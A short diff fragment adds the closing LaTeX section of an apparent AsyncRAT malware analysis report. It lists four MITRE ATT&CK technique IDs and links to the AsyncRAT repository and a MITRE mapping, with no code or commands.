+\subsection{MITRE ATT\&CK}
+
+\begin{itemize}
+    \item T1568: Dynamic Resolution
+    \item T1564.003: Hidden Window
+    \item T1106: Native API
+    \item T1053.005: Scheduled Task
+\end{itemize}
+
+\clearpage
+
+\section{Additional resources}
+
+\begin{itemize}
+    \item \href{https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/README.md}{AsyncRAT Github repository}
+    \item \href{https://mitre-attack.github.io/attack-navigator//#layerURL=https%3A%2F%2Fattack.mitre.org%2Fsoftware%2FS1087%2FS1087-enterprise-layer.json}{MITRE ATT\&CK Mapping for AsyncRAT}
+\end{itemize}
+
+
+\end{document}
+
+%%  ========================================================================
+%%  Content and document end
+%%  ========================================================================
